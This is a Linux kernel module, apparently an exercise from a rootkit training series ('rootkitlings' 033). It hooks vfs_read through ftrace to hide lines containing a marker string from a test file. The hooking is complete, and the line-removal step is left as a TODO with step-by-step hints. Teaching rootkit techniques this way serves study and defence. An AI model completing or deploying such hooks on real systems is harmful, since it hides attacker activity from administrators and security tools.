#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/namei.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("033: hide a line from a file's content");

#define TARGET_FILE "/tmp/rootkitlings_test.conf"
#define HIDE_MARKER "rootkit_secret_line"

static asmlinkage ssize_t (*orig_vfs_read)(struct file *, char __user *, size_t, loff_t *);

static asmlinkage ssize_t hook_vfs_read(struct file *file,
                                         char __user *buf,
                                         size_t count,
                                         loff_t *pos)
{
    ssize_t ret;
    char *pathname, *p;
    char *kbuf;
    char *line_start, *line_end;
    int line_len;

    ret = orig_vfs_read(file, buf, count, pos);
    if (ret <= 0)
        return ret;

    pathname = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!pathname)
        return ret;

    p = d_path(&file->f_path, pathname, PATH_MAX);
    if (IS_ERR(p) || strcmp(p, TARGET_FILE) != 0) {
        kfree(pathname);
        return ret;
    }
    kfree(pathname);

    kbuf = kzalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    // TODO(rootkitlings): cherche HIDE_MARKER dans kbuf avec strstr.
    //   Si trouve:
    //     1. Remonte au debut de la ligne (cherche le \n precedent ou le debut du buffer)
    //     2. Trouve la fin de la ligne (le \n suivant, ou la fin du buffer)
    //     3. Calcule la longueur de la ligne (avec le \n)
    //     4. memmove pour retirer la ligne
    //     5. Reduis ret de la longueur de la ligne
    //     6. copy_to_user le buffer modifie
    //
    //   ~10 lignes.

    kfree(kbuf);
    return ret;
}

static struct fthelper_hook hook = {
    .name = "vfs_read",
    .hook_fn = hook_vfs_read,
    .orig_fn = &orig_vfs_read,
};

static int __init hideline_init(void)
{
    int err;

    pr_info("rootkitlings/033: installing vfs_read hook\n");
    err = fthelper_install(&hook);
    if (err)
        return err;

    pr_info("rootkitlings/033: hiding lines with '%s' in %s\n",
            HIDE_MARKER, TARGET_FILE);
    return 0;
}

static void __exit hideline_exit(void)
{
    fthelper_remove(&hook);
    pr_info("rootkitlings/033: hook removed\n");
}

module_init(hideline_init);
module_exit(hideline_exit);
